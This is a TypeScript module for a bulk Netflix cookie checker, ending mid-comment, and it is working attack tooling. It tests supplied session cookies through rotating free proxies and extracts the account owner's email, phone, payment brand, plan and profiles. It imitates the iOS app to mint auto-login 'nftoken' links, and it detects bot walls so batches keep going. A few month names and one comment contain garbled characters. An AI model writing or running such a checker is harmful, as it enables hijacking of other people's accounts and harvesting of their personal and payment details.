// ─────────────────────────────────────────────────────────────────────────────
// Native Netflix cookie checker — NO third-party API.
//
// This talks to Netflix directly, exactly like the open-source Python tools it
// is based on:
//   • Account check : GET https://www.netflix.com/YourAccount with the cookie.
//                     A valid session renders the account page (which inlines a
//                     `reactContext` JSON blob with plan/email/country); a dead
//                     session is redirected to the login page.
//   • Extra members : GET .../accountowner/addextramember — 200 only when the
//                     account actually has the extra-member add-on available.
//   • nftoken link  : GET Netflix's iOS FTL endpoint with just NetflixId to mint
//                     an auto-login token, then build https://netflix.com/?nftoken=
//
// Everything returns the same `CheckResult` shape the UI already consumes, so the
// rest of the app is unchanged.
// ─────────────────────────────────────────────────────────────────────────────
import { Agent, fetch, type Dispatcher } from "undici"
import { buildAuthLinks, type CheckResult } from "./normalize-upstream"
import type { CheckErrorCategory } from "./check-errors"

const ACCOUNT_URL = "https://www.netflix.com/YourAccount"
const EXTRA_MEMBER_URL = "https://www.netflix.com/accountowner/addextramember"
const TOKEN_URL = "https://ios.prod.ftl.netflix.com/iosui/user/15.48"
// The /account page only inlines the ACTIVE profile; the full profile list lives
// on the profiles-management gate, so we fetch it separately to list them all.
const PROFILES_URL = "https://www.netflix.com/profiles/manage"

// SECURITY — every endpoint the cookie is sent to MUST be https://. The cookie
// (NetflixId / SecureNetflixId) travels in the request headers; over http:// it
// would be readable in CLEARTEXT by any proxy or network hop. HTTPS keeps it
// encrypted end-to-end so an untrusted public proxy only relays opaque bytes.
// This guard fails LOUDLY at module load if a future edit ever points one of
// these at a non-https URL, so a typo can never silently downgrade to cleartext.
for (const [name, url] of Object.entries({ ACCOUNT_URL, EXTRA_MEMBER_URL, TOKEN_URL, PROFILES_URL })) {
  if (!url.startsWith("https://")) {
    throw new Error(`SECURITY: ${name} must use https:// to protect cookies in transit (got: ${url})`)
  }
}

// SECURITY — host allowlist. A request can follow redirects; a hostile public
// proxy could 302 us to an attacker-controlled HTTPS host (where IT holds a valid
// cert) and serve FAKE account JSON to make a dead cookie look alive, or a fake
// login page. (undici already strips the Cookie header on cross-origin redirects,
// so the cookie itself isn't leaked — but we must still refuse to TRUST a response
// that didn't actually come from Netflix.) We verify the FINAL response URL host
// is netflix.com or a subdomain before parsing it as a real verdict.
function isNetflixHost(rawUrl: string): boolean {
  try {
    const { protocol, hostname } = new URL(rawUrl)
    if (protocol !== "https:") return false
    const host = hostname.toLowerCase()
    return host === "netflix.com" || host.endsWith(".netflix.com")
  } catch {
    return false
  }
}

// Per-request timeout to Netflix on the DIRECT path. Generous enough for a slow
// edge node, short enough that a hung request fails fast instead of stalling a
// batch. Bounded so the worst-case cookie (all attempts timing out) still finishes
// well within the server's maxDuration and the client's batch timeout.
const REQUEST_TIMEOUT_MS = 11_000

// Per-request timeout when dialing through a FREE PROXY. Free proxies are either
// fast or hopeless — a slow one is almost never worth waiting for, so we abandon
// it aggressively and let the caller hop to a fresh proxy immediately ("don't wait
// too long; cancel and switch fresh proxy"). Much shorter than the direct timeout.
export const PROXY_REQUEST_TIMEOUT_MS = 5_000

// Reuse warm sockets to Netflix across checks (avoids paying TCP+TLS per request).
// Keep idle sockets shorter-lived than the server's own idle close to avoid
// reusing a half-dead connection (which would stall ~10s until TCP gives up).
const netflixAgent = new Agent({
  // Bounded socket pool. The CLIENT now self-limits how many batches are in
  // flight (adaptive AIMD), so a single instance never needs a huge pool — and a
  // smaller pool is itself a safety valve against opening connections faster
  // than Netflix's edge will accept (the cause of "Could not reach Netflix").
  // Each ALIVE cookie makes a few SEQUENTIAL sub-requests, so connections ≈
  // cookies-in-flight, not cookies × sub-requests.
  connections: 48,
  keepAliveTimeout: 4_000,
  keepAliveMaxTimeout: 4_000,
  connect: { timeout: 10_000 },
  pipelining: 1,
})

// Realistic desktop-browser headers for the account page. `Accept-Encoding:
// identity` asks Netflix not to compress, so regex scanning the HTML is reliable.
const BROWSER_HEADERS: Record<string, string> = {
  "User-Agent":
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
  Accept: "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
  "Accept-Language": "en-US,en;q=0.9",
  "Accept-Encoding": "identity",
  "Upgrade-Insecure-Requests": "1",
}

// Query params + headers for Netflix's iOS FTL "createAutoLoginToken" call. These
// emulate the official iOS app; the endpoint 404s without the routing headers.
const TOKEN_PARAMS = new URLSearchParams({
  appVersion: "15.48.1",
  device_type: "NFAPPL-02-",
  idiom: "phone",
  iosVersion: "15.8.5",
  isTablet: "false",
  languages: "en-US",
  locale: "en-US",
  maxDeviceWidth: "375",
  model: "saget",
  modelType: "IPHONE8-1",
  odpAware: "true",
  path: '["account","token","default"]',
  pathFormat: "graph",
  pixelDensity: "2.0",
  progressive: "false",
  responseFormat: "json",
})

const TOKEN_HEADERS: Record<string, string> = {
  "User-Agent": "Argo/15.48.1 (iPhone; iOS 15.8.5; Scale/2.00)",
  "x-netflix.request.attempt": "1",
  "x-netflix.request.routing": '{"path":"/nq/mobile/nqios/~15.48.0/user","control_tag":"iosui_argo"}',
  "x-netflix.context.app-version": "15.48.1",
  "x-netflix.argo.translated": "true",
  "x-netflix.context.form-factor": "phone",
  "x-netflix.context.sdk-version": "2012.4",
  "x-netflix.client.appversion": "15.48.1",
  "x-netflix.client.type": "argo",
  "x-netflix.context.locales": "en-US",
  "x-netflix.client.iosversion": "15.8.5",
  "accept-language": "en-US;q=1",
  "x-netflix.context.os-version": "15.8.5",
  "x-netflix.context.ui-flavor": "argo",
  "x-netflix.argo.nfnsm": "9",
}

export type NativeError = { errorCategory: CheckErrorCategory; retryAfterMs?: number }

const utf8Decoder = new TextDecoder("utf-8", { fatal: false })

// Decodes the hex/unicode escapes Netflix embeds in its inline JSON, e.g.
// "user\x40gmail.com" -> "user@gmail.com", "\u00a0" -> non-breaking space.
//
// Netflix emits non-ASCII characters as raw UTF-8 *bytes* in \xNN form — e.g.
// "José" -> "Jos\xc3\xa9" and emoji profile names -> "\xf0\x9f...". Decoding each
// \xNN as an independent code point (the old behaviour) turned a 2-byte "é" into
// "Ã©" and emoji into 4 garbage glyphs — the "random characters" bug. So a run of
// consecutive \xNN escapes must be decoded together as one UTF-8 byte sequence.
// Common named HTML entities that show up in profile names (accented Latin
// letters + a few symbols). Netflix inlines profile names HTML-escaped inside its
// JSON state, so "Jïnkërbü" arrives as "J&iuml;nk&euml;rb&uuml;" — without this it
// rendered as literal "&iuml;" garbage. Numeric entities are handled separately.
const NAMED_HTML_ENTITIES: Record<string, string> = {
  amp: "&", lt: "<", gt: ">", quot: '"', apos: "'", nbsp: " ", uml: "\u00a8",
  agrave: "à", aacute: "á", acirc: "â", atilde: "ã", auml: "ä", aring: "å", aelig: "æ",
  ccedil: "ç", egrave: "è", eacute: "é", ecirc: "ê", euml: "ë",
  igrave: "ì", iacute: "í", icirc: "î", iuml: "ï", ntilde: "ñ", eth: "ð",
  ograve: "ò", oacute: "ó", ocirc: "ô", otilde: "õ", ouml: "ö", oslash: "ø",
  ugrave: "ù", uacute: "ú", ucirc: "û", uuml: "ü", yacute: "ý", yuml: "ÿ", szlig: "ß",
  Agrave: "À", Aacute: "Á", Acirc: "Â", Atilde: "Ã", Auml: "Ä", Aring: "Å", AElig: "Æ",
  Ccedil: "Ç", Egrave: "È", Eacute: "É", Ecirc: "Ê", Euml: "Ë",
  Igrave: "Ì", Iacute: "Í", Icirc: "Î", Iuml: "Ï", Ntilde: "Ñ",
  Ograve: "Ò", Oacute: "Ó", Ocirc: "Ô", Otilde: "Õ", Ouml: "Ö", Oslash: "Ø",
  Ugrave: "Ù", Uacute: "Ú", Ucirc: "Û", Uuml: "Ü", Yacute: "Ý",
}

// Decodes HTML entities — numeric (&#233; / &#xE9;) and the named set above.
function decodeHtmlEntities(value: string): string {
  if (!value.includes("&")) return value
  return value
    .replace(/&#x([0-9A-Fa-f]+);/g, (_, h) => safeFromCodePoint(Number.parseInt(h, 16)))
    .replace(/&#(\d+);/g, (_, d) => safeFromCodePoint(Number.parseInt(d, 10)))
    .replace(/&([A-Za-z]+);/g, (m, name) => NAMED_HTML_ENTITIES[name] ?? m)
}

function safeFromCodePoint(cp: number): string {
  try {
    return Number.isFinite(cp) ? String.fromCodePoint(cp) : ""
  } catch {
    return ""
  }
}

function decodeEscapes(value: string): string {
  return decodeHtmlEntities(
    value
      .replace(/(?:\\x[0-9A-Fa-f]{2})+/g, (run) => {
        const bytes = (run.match(/\\x([0-9A-Fa-f]{2})/g) ?? []).map((h) => Number.parseInt(h.slice(2), 16))
        try {
          return utf8Decoder.decode(Uint8Array.from(bytes))
        } catch {
          return run
        }
      })
      // \uNNNN escapes are UTF-16 code units; consecutive ones (surrogate pairs)
      // concatenate into the correct astral character automatically.
      .replace(/\\u([0-9A-Fa-f]{4})/g, (_, h) => String.fromCharCode(Number.parseInt(h, 16))),
  )
}

// Pulls a single named cookie's value out of a RAW cookie string.
function readCookieValue(rawCookie: string, name: string): string | undefined {
  const re = new RegExp(`(?:^|;|\\s)${name}=([^;]+)`, "i")
  const m = rawCookie.match(re)
  return m ? m[1].trim() : undefined
}

// Lowercases and strips diacritics so "março"/"marco", "février"/"fevrier",
// "ağustos"/"agustos" all collapse to a single comparable token.
function normalizeToken(s: string): string {
  return s
    .normalize("NFD")
    .replace(/[\u0300-\u036f]/g, "")
    .toLowerCase()
    .trim()
}

// Localized month tokens (accent-stripped, lowercased — full names AND common
// 3-4 letter abbreviations) mapped to a 1-12 month index. Covers every
// Latin-script language Netflix localizes account pages into, so a billing date
// in any of them can be rendered in English. CJK / ISO / numeric date formats
// are handled separately in englishifyDate (they carry the month as a number).
const MONTH_INDEX: Record<string, number> = {}
function registerMonths(lang: string[][]) {
  // lang: array of 12 entries, each an array of accepted tokens for that month.
  lang.forEach((tokens, i) => {
    for (const t of tokens) MONTH_INDEX[normalizeToken(t)] = i + 1
  })
}
// English (+ abbreviations)
registerMonths([
  ["january", "jan"], ["february", "feb"], ["march", "mar"], ["april", "apr"],
  ["may"], ["june", "jun"], ["july", "jul"], ["august", "aug"],
  ["september", "sep", "sept"], ["october", "oct"], ["november", "nov"], ["december", "dec"],
])
// Spanish
registerMonths([
  ["enero", "ene"], ["febrero", "feb"], ["marzo", "mar"], ["abril", "abr"],
  ["mayo", "may"], ["junio", "jun"], ["julio", "jul"], ["agosto", "ago"],
  ["septiembre", "setiembre", "sep", "set"], ["octubre", "oct"], ["noviembre", "nov"], ["diciembre", "dic"],
])
// Portuguese
registerMonths([
  ["janeiro", "jan"], ["fevereiro", "fev"], ["março", "marco", "mar"], ["abril", "abr"],
  ["maio", "mai"], ["junho", "jun"], ["julho", "jul"], ["agosto", "ago"],
  ["setembro", "set"], ["outubro", "out"], ["novembro", "nov"], ["dezembro", "dez"],
])
// French
registerMonths([
  ["janvier", "janv"], ["février", "fevrier", "févr", "fevr"], ["mars"], ["avril", "avr"],
  ["mai"], ["juin"], ["juillet", "juil"], ["août", "aout"],
  ["septembre", "sept"], ["octobre", "oct"], ["novembre", "nov"], ["décembre", "decembre", "déc", "dec"],
])
// German
registerMonths([
  ["januar", "jan", "jän", "jaen"], ["februar", "feb"], ["märz", "marz", "mrz"], ["april", "apr"],
  ["mai"], ["juni"], ["juli"], ["august", "aug"],
  ["september", "sep"], ["oktober", "okt"], ["november", "nov"], ["dezember", "dez"],
])
// Italian
registerMonths([
  ["gennaio", "gen"], ["febbraio", "feb"], ["marzo", "mar"], ["aprile", "apr"],
  ["maggio", "mag"], ["giugno", "giu"], ["luglio", "lug"], ["agosto", "ago"],
  ["settembre", "set"], ["ottobre", "ott"], ["novembre", "nov"], ["dicembre", "dic"],
])
// Dutch
registerMonths([
  ["januari", "jan"], ["februari", "feb"], ["maart", "mrt"], ["april", "apr"],
  ["mei"], ["juni", "jun"], ["juli", "jul"], ["augustus", "aug"],
  ["september", "sep"], ["oktober", "okt"], ["november", "nov"], ["december", "dec"],
])
// Polish (nominative + genitive)
registerMonths([
  ["styczeń", "stycznia", "sty"], ["luty", "lutego", "lut"], ["marzec", "marca", "mar"], ["kwiecień", "kwietnia", "kwi"],
  ["maj", "maja"], ["czerwiec", "czerwca", "cze"], ["lipiec", "lipca", "lip"], ["sierpień", "sierpnia", "sie"],
  ["wrzesień", "września", "wrz"], ["pa��dziernik", "października", "paź", "paz"], ["listopad", "listopada", "lis"], ["grudzień", "grudnia", "gru"],
])
// Turkish
registerMonths([
  ["ocak", "oca"], ["şubat", "subat", "şub", "sub"], ["mart", "mar"], ["nisan", "nis"],
  ["mayıs", "mayis", "may"], ["haziran", "haz"], ["temmuz", "tem"], ["ağustos", "agustos", "ağu", "agu"],
  ["eylül", "eylul", "eyl"], ["ekim", "eki"], ["kasım", "kasim", "kas"], ["aralık", "aralik", "ara"],
])
// Indonesian / Malay
registerMonths([
  ["januari", "jan"], ["februari", "pebruari", "feb"], ["maret", "mac", "mar"], ["april", "apr"],
  ["mei"], ["juni", "jun"], ["juli", "jul"], ["agustus", "ogos", "agu", "ags"],
  ["september", "sep"], ["oktober", "okt"], ["november", "nopember", "nov"], ["desember", "disember", "des"],
])
// Vietnamese ("tháng 7" — month carried as a number, also handled numerically)
registerMonths([
  ["tháng một", "thang mot"], ["tháng hai", "thang hai"], ["tháng ba", "thang ba"], ["tháng tư", "thang tu"],
  ["tháng năm", "thang nam"], ["tháng sáu", "thang sau"], ["tháng bảy", "thang bay"], ["tháng tám", "thang tam"],
  ["tháng chín", "thang chin"], ["tháng mười", "thang muoi"], ["tháng mười một", "thang muoi mot"], ["tháng mười hai", "thang muoi hai"],
])
// Romanian
registerMonths([
  ["ianuarie", "ian"], ["februarie", "feb"], ["martie", "mar"], ["aprilie", "apr"],
  ["mai"], ["iunie", "iun"], ["iulie", "iul"], ["august", "aug"],
  ["septembrie", "sep"], ["octombrie", "oct"], ["noiembrie", "noi"], ["decembrie", "dec"],
])
// Swedish / Norwegian / Danish
registerMonths([
  ["januari", "januar", "jan"], ["februari", "februar", "feb"], ["mars", "marts", "mar"], ["april", "apr"],
  ["maj", "mai"], ["juni", "jun"], ["juli", "jul"], ["augusti", "august", "aug"],
  ["september", "sep"], ["oktober", "okt"], ["november", "nov"], ["december", "desember", "dec", "des"],
])
// Finnish (partitive forms used in dates)
registerMonths([
  ["tammikuuta", "tammikuu", "tammi"], ["helmikuuta", "helmikuu", "helmi"], ["maaliskuuta", "maaliskuu", "maalis"], ["huhtikuuta", "huhtikuu", "huhti"],
  ["toukokuuta", "toukokuu", "touko"], ["kesäkuuta", "kesakuuta", "kes��kuu", "kesa"], ["heinäkuuta", "heinakuuta", "heinäkuu", "heina"], ["elokuuta", "elokuu", "elo"],
  ["syyskuuta", "syyskuu", "syys"], ["lokakuuta", "lokakuu", "loka"], ["marraskuuta", "marraskuu", "marras"], ["joulukuuta", "joulukuu", "joulu"],
])

const EN_MONTHS_FULL = [
  "January", "February", "March", "April", "May", "June",
  "July", "August", "September", "October", "November", "December",
]

// Formats an epoch-millisecond timestamp into an English "Month YYYY" string.
function formatEpochMonthYear(epochMs: number): string | undefined {
  if (!Number.isFinite(epochMs) || epochMs <= 0) return undefined
  const d = new Date(epochMs)
  if (Number.isNaN(d.getTime())) return undefined
  return `${EN_MONTHS_FULL[d.getUTCMonth()]} ${d.getUTCFullYear()}`
}

// Builds a canonical English "Month D, YYYY" string from numeric parts.
function formatYmd(year: number, month: number, day: number): string | undefined {
  if (month < 1 || month > 12 || day < 1 || day > 31 || year < 1900 || year > 3000) return undefined
  return `${EN_MONTHS_FULL[month - 1]} ${day}, ${year}`
}

// Converts ANY localized Netflix billing-date string into English. Netflix
// serves this field in the account's billing-country language and offers no
// epoch alternative, so we parse it ourselves. Handles, in priority order:
//   1. Strings containing a recognizable month WORD (any supported language).
//   2. CJK formats with 年/月/日 or 년/월/일 markers ("2026年7月6日").
//   3. ISO "YYYY-MM-DD".
//   4. Purely numeric "D/M/Y", "D.M.Y", "Y/M/D" (non-US locales are DMY).
// Falls back to the original string only if nothing parses.
function englishifyDate(value: string): string {
  const v = value.trim()

  // 1. Month word in any supported language. Match the LONGEST known month token
  //    that appears as a whole word in the accent-stripped string (longest wins
  //    so "mayo" is preferred over "may", etc.), then read the day & year.
  const norm = normalizeToken(v)
  let monthIdx = 0
  let bestLen = 0
  for (const token in MONTH_INDEX) {
    if (token.length <= bestLen) continue
    const re = new RegExp(`(?:^|[^a-z])${token}(?:[^a-z]|$)`)
    if (re.test(norm)) {
      monthIdx = MONTH_INDEX[token]
      bestLen = token.length
    }
  }
  if (monthIdx) {
    const nums = v.match(/\d+/g)?.map(Number) ?? []
    const year = nums.find((n) => n >= 1900 && n <= 3000)
    const day = nums.find((n) => n >= 1 && n <= 31 && n !== year)
    if (year) return formatYmd(year, monthIdx, day ?? 1) ?? `${EN_MONTHS_FULL[monthIdx - 1]} ${year}`
  }

  // 2. CJK: month is the number right before 月 (Japanese/Chinese) or 월 (Korean).
  const cjk = v.match(/(\d{4})\s*[年년]\s*(\d{1,2})\s*[月월]\s*(\d{1,2})\s*[日일]?/)
  if (cjk) {
    const out = formatYmd(Number(cjk[1]), Number(cjk[2]), Number(cjk[3]))
    if (out) return out
  }

  // 3. ISO YYYY-MM-DD (also tolerate / or .).
  const iso = v.match(/^(\d{4})[-/.](\d{1,2})[-/.](\d{1,2})$/)
  if (iso) {
    const out = formatYmd(Number(iso[1]), Number(iso[2]), Number(iso[3]))
    if (out) return out
  }

  // 4. Numeric D/M/Y, D.M.Y, D-M-Y (non-US locales use day-first). If the first
  //    part can't be a day (>31) treat it as a year (Y/M/D).
  const num = v.match(/^(\d{1,4})[-/.](\d{1,2})[-/.](\d{1,4})$/)
  if (num) {
    const a = Number(num[1]), b = Number(num[2]), c = Number(num[3])
    const out = a > 31 ? formatYmd(a, b, c) : formatYmd(c, b, a)
    if (out) return out
  }

  return value
}

// Maps Netflix's localized plan names to canonical English tiers, ALWAYS
// collapsing any "Extra Member" / "Miembro extra" suffix into its parent tier
// (e.g. "Premium (Miembro Extra)" → "Premium"). Returns a canonical English
// tier, or undefined when the localized word is unrecognized (the caller then
// falls back to locale-independent signals — see derivePlanFromSignals).
function englishifyPlan(plan: string): string | undefined {
  const p = normalizeToken(plan)
  // Premium — spelled the same across nearly all languages.
  if (p.includes("premium")) return "Premium"
  // Standard — es: estandar, pt: padrao, nl: standaard, id/ms: standar, tr: standart,
  // it: standard, de/se/no/dk: standard, pl: standardowy, ro: standard.
  if (
    p.includes("estandar") || p.includes("standar") || p.includes("standard") ||
    p.includes("standart") || p.includes("padrao") || p.includes("standaard")
  ) {
    return "Standard"
  }
  // Mobile — en: mobile, es: movil, pt: celular, id: ponsel/seluler, generic: phone.
  if (
    p.includes("movil") || p.includes("mobile") || p.includes("celular") ||
    p.includes("ponsel") || p.includes("seluler") || p.includes("phone")
  ) {
    return "Mobile"
  }
  // Basic �� en: basic, es/pt: basico/basica, it: base, id: dasar, tr: temel, de: basis.
  if (
    p.includes("basic") || p.includes("basico") || p.includes("basica") ||
    p.includes("dasar") || p.includes("temel") || p.includes("basis") ||
    /\bbase\b/.test(p)
  ) {
    return "Basic"
  }
  return undefined
}

// Locale-independent plan fallback. When the localized plan WORD isn't
// recognized (e.g. Thai/Arabic/Hindi script), derive the canonical tier from
// signals Netflix returns the same in every language: max simultaneous streams
// and max video quality. This guarantees an English tier even for languages we
// don't translate by word.
function derivePlanFromSignals(videoQuality?: string, maxStreams?: number): string | undefined {
  const q = (videoQuality ?? "").toUpperCase()
  if (q.includes("UHD") || q.includes("4K")) return "Premium"
  if (maxStreams && maxStreams >= 4) return "Premium"
  if (q.includes("FHD") || q === "1080P") return "Standard"
  if (maxStreams === 2) return "Standard"
  if (q === "HD" || q === "720P") return "Standard"
  if (maxStreams === 1 && (q.includes("SD") || q === "480P")) return "Basic"
  return undefined
}

// Friendly English labels for Netflix's payment-method enum codes. These codes
// are locale-independent (always English-ish), so mapping them guarantees an
// English label regardless of account country.
const PAYMENT_METHOD_LABELS: Record<string, string> = {
  CREDIT_CARD: "Credit Card", CREDITCARD: "Credit Card", CREDIT: "Credit Card",
  DEBIT_CARD: "Debit Card", DEBITCARD: "Debit Card", DEBIT: "Debit Card",
  CARD: "Card",
  MOBILE_WALLET: "Mobile Wallet", WALLET: "Mobile Wallet",
  DCB: "Carrier Billing", DIRECT_CARRIER_BILLING: "Carrier Billing",
  MOBILE_CARRIER: "Carrier Billing", CARRIER_BILLING: "Carrier Billing", PARTNER_DCB: "Carrier Billing",
  PAYPAL: "PayPal",
  GIFT_CARD: "Gift Card", PREPAID: "Gift Card", GIFTCARD: "Gift Card",
  ITUNES: "iTunes", GOOGLE: "Google Play", GOOGLE_PLAY: "Google Play",
  UPI: "UPI", NET_BANKING: "Net Banking", NETBANKING: "Net Banking",
  SEPA: "Direct Debit", DIRECT_DEBIT: "Direct Debit", BANK_ACCOUNT: "Bank Account", IDEAL: "iDEAL",
  PARTNER: "Partner Billing", BUNDLE: "Partner Billing",
}

// Recognizable card/wallet brands from `paymentOptionLogo` — more specific than
// the method enum, so we prefer these when present (e.g. "GCash", "Visa").
const PAYMENT_LOGO_LABELS: Record<string, string> = {
  VISA: "Visa", MASTERCARD: "Mastercard", MASTER_CARD: "Mastercard",
  AMEX: "American Express", AMERICAN_EXPRESS: "American Express",
  DISCOVER: "Discover", JCB: "JCB", DINERS: "Diners Club", DINERS_CLUB: "Diners Club",
  UNIONPAY: "UnionPay", ELO: "Elo", HIPERCARD: "Hipercard", MAESTRO: "Maestro",
  GCASH: "GCash", PAYMAYA: "Maya", PAYPAL: "PayPal", DANA: "DANA", OVO: "OVO",
}

// Resolves the most informative, English payment label. Prefers a known brand
// from the logo, then a friendly method label, then a Title-Cased version of the
// raw enum so even unknown codes read as clean English ("FOO_BAR" → "Foo Bar").
function englishifyPayment(method?: string, logo?: string): string | undefined {
  if (logo) {
    const brand = PAYMENT_LOGO_LABELS[logo.toUpperCase().replace(/\s+/g, "_")]
    if (brand) return brand
  }
  if (method) {
    const key = method.toUpperCase().replace(/[\s-]+/g, "_")
    const label = PAYMENT_METHOD_LABELS[key]
    if (label) return label
    // Generic: Title-Case the enum so it's readable English.
    return method.replace(/_/g, " ").toLowerCase().replace(/\b\w/g, (c) => c.toUpperCase())
  }
  return undefined
}

// Pure i18n helpers exported for unit testing. Not part of the runtime API.
export const __i18n = { englishifyDate, englishifyPlan, derivePlanFromSignals, englishifyPayment }

// Escape decoder exported for unit testing. Not part of the runtime API.
export const __decodeEscapes = decodeEscapes

// Pure page-classification helpers exported for unit testing. Not part of the
// runtime API — these back the proxy false-dead guard in checkCookieNative.
export const __classify = {
  isBlockedInterstitial: (html: string) => isBlockedInterstitial(html),
  looksLikeNetflixLoggedOut: (html: string) => looksLikeNetflixLoggedOut(html),
}

// Extracts account fields from the inline `reactContext` JSON in the page HTML.
function extractAccountInfo(html: string): {
  plan?: string
  email?: string
  countryCode?: string
  regionLocked?: boolean
  memberSince?: string
  nextBillingCycle?: string
  paymentMethod?: string
  phone?: string
  maxStreams?: number
  profiles?: string[]
  emailVerified?: boolean
  membershipStatus?: string
  isUserOnHold?: boolean
  serviceEndReason?: string
} {
  const grab = (pattern: RegExp): string | undefined => {
    const m = html.match(pattern)
    return m ? decodeEscapes(m[1]) : undefined
  }
  // Grabs a `"field":{"fieldType":"String","value":"…"}` wrapped value.
  const grabField = (field: string): string | undefined =>
    grab(new RegExp(`"${field}"\\s*:\\s*\\{[^}]*?"value"\\s*:\\s*"([^"]+)"`))

  const rawPlan = grabField("localizedPlanName")
  const email = grab(/"emailAddress"\s*:\s*"([^"]+)"/)
  const countryCode = grab(/"countryOfSignup"\s*:\s*"([^"]+)"/)
  const regionLocked = /not available in your country|not available in your region|unavailable in your location|title is not available|this title isn't available/i.test(html)

  // Payment: the method enum + (more specific) the card/wallet brand logo are
  // both locale-independent, so we resolve them to a friendly English label.
  const rawPaymentMethod = grabField("paymentMethod")
  const paymentLogo = grab(/"paymentOptionLogo"\s*:\s*"([^"]+)"/)
  const paymentMethod = englishifyPayment(rawPaymentMethod, paymentLogo)

  // Locale-independent plan signals (same value in every language).
  const videoQuality = grabField("videoQuality")

  // memberSince is a numeric epoch (locale-independent) — format it in English
  // ourselves so it never shows in the account's UI language.
  const memberSinceEpoch = html.match(/"memberSince"\s*:\s*\{[^}]*?"value"\s*:\s*(\d{10,})/)
  const memberSince = memberSinceEpoch
    ? formatEpochMonthYear(Number(memberSinceEpoch[1]))
    : grab(/"memberSince"\s*:\s*"([^"]+)"/)

  // nextBillingDate is a localized string — translate its month to English.
  const nextBillingRaw = grabField("nextBillingDate") ?? grab(/"nextInvoiceDate"\s*:\s*"([^"]+)"/)
  const nextBillingCycle = nextBillingRaw ? englishifyDate(nextBillingRaw) : undefined

  // Phone: "0965\x20142\x208583" → "0965 142 8583".
  const phone = grab(/"phoneNumber"\s*:\s*"([^"]+)"/)

  // Max simultaneous streams (Numeric field).
  const streamsMatch = html.match(/"maxStreams"\s*:\s*\{[^}]*?"value"\s*:\s*(\d+)/)
  const maxStreams = streamsMatch ? Number(streamsMatch[1]) : undefined

  // Profiles: collect every known profile representation, preserving order and
  // deduplicating case-insensitively. Netflix has changed this payload several times.
  const profiles = collectProfileNames(html)

  const emailVerifiedRaw = html.match(/"emailVerified"\s*:\s*(true|false)/)
  const emailVerified = emailVerifiedRaw ? emailVerifiedRaw[1] === "true" : undefined

  // Netflix inlines the account's membership status in the account JSON, e.g.
  // "membershipStatus":"CURRENT_MEMBER" / "FORMER_MEMBER" / "NEVER_MEMBER" /
  // "ON_HOLD" / "ANONYMOUS". A live SESSION whose membership is NOT current still
  // renders the account page (so it would otherwise read as "alive") but cannot
  // stream — i.e. a "free"/cancelled/on-hold "not working" account. We surface the
  // raw status so the checker can reject those, eliminating that false-alive class.
  const membershipStatus = grab(/"membershipStatus"\s*:\s*"([^"]+)"/)

  // ON-HOLD detection — CRITICAL and independent of membershipStatus. When an
  // account's LAST PAYMENT FAILS, Netflix puts it "on hold" (the "Your account is on
  // hold. Retry your payment?" wall) — but it STILL reports
  // "membershipStatus":"CURRENT_MEMBER", so membershipStatus alone NEVER catches this
  // class. The authoritative signal lives in the account's GrowthHoldMetadata:
  //   "isUserOnHold":true, "serviceEndReason":"SERVICE_END_PAYMENT_FAILURE"
  // These sessions log in and render the account page but CANNOT stream, so they must
  // be flagged and kept out of reward distribution. We match the account-level hold
  // flag (isUserOnHold) — distinct from the feature-only hold key hasFeatureOnlyHold.
  const isUserOnHold = /"isUserOnHold"\s*:\s*true/.test(html)
  const serviceEndReason = grab(/"serviceEndReason"\s*:\s*"([^"]+)"/)

  // ACCURACY GUARD — only trust an AUTHENTIC account signal as proof of being
  // logged in. emailAddress / countryOfSignup appear ONLY in the authenticated
  // account JSON, never on a logged-out / signup page.
  const hasAuthenticSignal = Boolean(email || countryCode)

  // Resolve plan to a canonical ENGLISH tier. Priority:
  //   1. Translate the localized plan word (covers most languages).
  //   2. Locale-independent signals (video quality + max streams) — guarantees
  //      English even for languages we don't translate by word (Thai, Arabic…).
  //   3. Last resort: scan for an English tier word literally present in the HTML —
  //      but ONLY when we already have an authentic account signal. Netflix's
  //      logged-out home/signup pages list "Premium/Standard/Basic" in plan-
  //      comparison MARKETING, so scanning for those words on a logged-out page
  //      would falsely resolve a plan and make a DEAD cookie look alive. Gating it
  //      behind hasAuthenticSignal removes that false-positive without affecting
  //      real account pages (which always carry email/country).
  let resolvedPlan = rawPlan ? englishifyPlan(rawPlan) : undefined
  if (!resolvedPlan) resolvedPlan = derivePlanFromSignals(videoQuality, maxStreams)
  if (!resolvedPlan && hasAuthenticSignal) {
    for (const candidate of ["Premium", "Standard", "Basic"]) {
      if (html.includes(candidate)) {
        resolvedPlan = candidate
        break
      }
    }
  }

  return {
    plan: resolvedPlan,
    email,
    countryCode,
    regionLocked,
    memberSince,
    nextBillingCycle,
    paymentMethod,
    phone,
    maxStreams,
    profiles,
    emailVerified,
    membershipStatus,
    isUserOnHold,
    serviceEndReason,
  }
}

// Maps a Netflix HTTP status into our retry-aware error category.
function categorize(status: number): CheckErrorCategory {
  if (status === 429) return "rate_limited"
  if (status === 403) return "upstream_error" // likely an IP block / challenge
  if (status >= 500) return "upstream_unavailable"
  return "upstream_error"
}

// ACCURACY GUARD — proxy false-dead detection.
// A flagged / datacenter proxy IP frequently gets served an EDGE interstitial
// (bot challenge, "Access Denied", Cloudflare/Akamai/Incapsula wall, captcha, or
// a geo/"not available in your country" page) instead of the real account page.
// Those come back 200 with NO account JSON and NO /login redirect, so the naive
// "no account data ⇒ dead" rule misreads them as a DEAD cookie. They are NOT a
// dead verdict — they're a proxy problem. Detect them so the caller can fail over
// to another proxy / retry instead of recording a FALSE dead. This is the main
// reason a cookie could read "dead" in bulk (many proxies) yet "alive" in the
// single checker (which leads with the healthiest proxy).
function isBlockedInterstitial(html: string): boolean {
  if (!html) return true // empty body from a proxy is never a trustworthy "dead"
  const h = html.slice(0, 20_000).toLowerCase()
  return (
    h.includes("pardon the interruption") || // Netflix anti-bot throttle page
    h.includes("access denied") ||
    h.includes("access to this page has been denied") ||
    h.includes("you don't have permission to access") ||
    h.includes("request unsuccessful") || // Incapsula
    h.includes("incapsula") ||
    h.includes("attention required") || // Cloudflare
    h.includes("cf-error") ||
    h.includes("cf-challenge") ||
    h.includes("just a moment") || // Cloudflare JS challenge
    h.includes("captcha") ||
    h.includes("ddos") ||
    h.includes("not available in your country") ||
    h.includes("proxy") && h.includes("blocked")
  )
}

// True only when the HTML is an AUTHENTIC Netflix logged-out / sign-in page — the
// signal we require before trusting a 200-with-no-account-data response as a real
